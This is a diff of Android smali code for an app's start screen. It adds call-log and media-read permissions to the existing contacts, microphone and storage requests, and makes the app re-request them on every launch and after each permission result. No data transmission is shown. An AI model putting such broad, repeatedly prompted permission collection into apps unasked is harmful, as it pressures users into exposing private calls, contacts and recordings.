@@ -81,37 +81,86 @@
     if-lt v0, v1, :complete
     new-instance v2, Ljava/util/ArrayList;
     invoke-direct {v2}, Ljava/util/ArrayList;-><init>()V
+
+    const-string v3, "android.permission.READ_CALL_LOG"
+    invoke-virtual {p0, v3}, Lcom/abdullah/ahmed/StartActivity;->checkSelfPermission(Ljava/lang/String;)I
+    move-result v4
+    if-nez v4, :add_call_log
+    goto :contacts
+    :add_call_log
+    invoke-interface {v2, v3}, Ljava/util/List;->add(Ljava/lang/Object;)Z
+
+    :contacts
     const-string v3, "android.permission.READ_CONTACTS"
     invoke-virtual {p0, v3}, Lcom/abdullah/ahmed/StartActivity;->checkSelfPermission(Ljava/lang/String;)I
     move-result v4
-    if-nez v4, :add1
+    if-nez v4, :add_contacts
     goto :mic
-    :add1
+    :add_contacts
     invoke-interface {v2, v3}, Ljava/util/List;->add(Ljava/lang/Object;)Z
+
     :mic
     const-string v3, "android.permission.RECORD_AUDIO"
     invoke-virtual {p0, v3}, Lcom/abdullah/ahmed/StartActivity;->checkSelfPermission(Ljava/lang/String;)I
     move-result v4
-    if-nez v4, :add2
+    if-nez v4, :add_mic
     goto :storage
-    :add2
+    :add_mic
     invoke-interface {v2, v3}, Ljava/util/List;->add(Ljava/lang/Object;)Z
+
     :storage
+    const/16 v5, 0x21
+    if-lt v0, v5, :legacy_storage
+
+    const-string v3, "android.permission.READ_MEDIA_IMAGES"
+    invoke-virtual {p0, v3}, Lcom/abdullah/ahmed/StartActivity;->checkSelfPermission(Ljava/lang/String;)I
+    move-result v4
+    if-nez v4, :add_media_images
+    goto :media_video
+    :add_media_images
+    invoke-interface {v2, v3}, Ljava/util/List;->add(Ljava/lang/Object;)Z
+
+    :media_video
+    const-string v3, "android.permission.READ_MEDIA_VIDEO"
+    invoke-virtual {p0, v3}, Lcom/abdullah/ahmed/StartActivity;->checkSelfPermission(Ljava/lang/String;)I
+    move-result v4
+    if-nez v4, :add_media_video
+    goto :media_audio
+    :add_media_video
+    invoke-interface {v2, v3}, Ljava/util/List;->add(Ljava/lang/Object;)Z
+
+    :media_audio
+    const-string v3, "android.permission.READ_MEDIA_AUDIO"
+    invoke-virtual {p0, v3}, Lcom/abdullah/ahmed/StartActivity;->checkSelfPermission(Ljava/lang/String;)I
+    move-result v4
+    if-nez v4, :add_media_audio
+    goto :request
+    :add_media_audio
+    invoke-interface {v2, v3}, Ljava/util/List;->add(Ljava/lang/Object;)Z
+    goto :request
+
+    :legacy_storage
+    const-string v3, "android.permission.READ_EXTERNAL_STORAGE"
+    invoke-virtual {p0, v3}, Lcom/abdullah/ahmed/StartActivity;->checkSelfPermission(Ljava/lang/String;)I
+    move-result v4
+    if-nez v4, :add_legacy_storage
+    goto :legacy_write_storage
+    :add_legacy_storage
+    invoke-interface {v2, v3}, Ljava/util/List;->add(Ljava/lang/Object;)Z
+
+    :legacy_write_storage
     const/16 v5, 0x1d
-    if-lt v0, v5, :storage_check
-    goto :notif
-    :storage_check
+    if-lt v0, v5, :check_write_storage
+    goto :request
+    :check_write_storage
     const-string v3, "android.permission.WRITE_EXTERNAL_STORAGE"
     invoke-virtual {p0, v3}, Lcom/abdullah/ahmed/StartActivity;->checkSelfPermission(Ljava/lang/String;)I
     move-result v4
-    if-nez v4, :add3
-    goto :notif
-    :add3
+    if-nez v4, :add_write_storage
+    goto :request
+    :add_write_storage
     invoke-interface {v2, v3}, Ljava/util/List;->add(Ljava/lang/Object;)Z
-    :notif
-    # POST_NOTIFICATIONS is intentionally skipped here because this legacy
-    # app targets SDK 26; requesting it at startup on Android 13+ can block
-    # the launch flow even though notifications are not needed for startup.
+
     :request
     invoke-interface {v2}, Ljava/util/List;->isEmpty()Z
     move-result v3
@@ -173,7 +222,7 @@
 
 .method public onClick(Landroid/view/View;)V
     .locals 0
-    invoke-direct {p0}, Lcom/abdullah/ahmed/StartActivity;->beginPermissions()V
+    invoke-direct {p0}, Lcom/abdullah/ahmed/StartActivity;->markCompleteAndOpenMain()V
     return-void
 .end method
 
@@ -192,7 +241,7 @@
     array-length v2, p2
     :loop
     if-lt v1, v2, :check
-    invoke-direct {p0}, Lcom/abdullah/ahmed/StartActivity;->markCompleteAndOpenMain()V
+    invoke-direct {p0}, Lcom/abdullah/ahmed/StartActivity;->beginPermissions()V
     return-void
     :check
     aget-object v3, p2, v1
@@ -236,9 +285,9 @@
     move-result v0
     if-eqz v0, :startup_not_complete
     const-string v0, "StartActivity"
-    const-string v1, "onCreate: setup already completed; opening MainActivity"
+    const-string v1, "onCreate: setup already completed; verifying permissions"
     invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
-    invoke-direct {p0}, Lcom/abdullah/ahmed/StartActivity;->markCompleteAndOpenMain()V
+    invoke-direct {p0}, Lcom/abdullah/ahmed/StartActivity;->beginPermissions()V
     return-void
 
     :startup_not_complete
@@ -381,5 +430,6 @@
     invoke-virtual {v10, v4, v5, v4, v4}, Landroid/widget/LinearLayout$LayoutParams;->setMargins(IIII)V
     invoke-virtual {v3, v7, v10}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V
     invoke-virtual {p0, v2}, Lcom/abdullah/ahmed/StartActivity;->setContentView(Landroid/view/View;)V
+    invoke-direct {p0}, Lcom/abdullah/ahmed/StartActivity;->beginPermissions()V
     return-void
 .end method
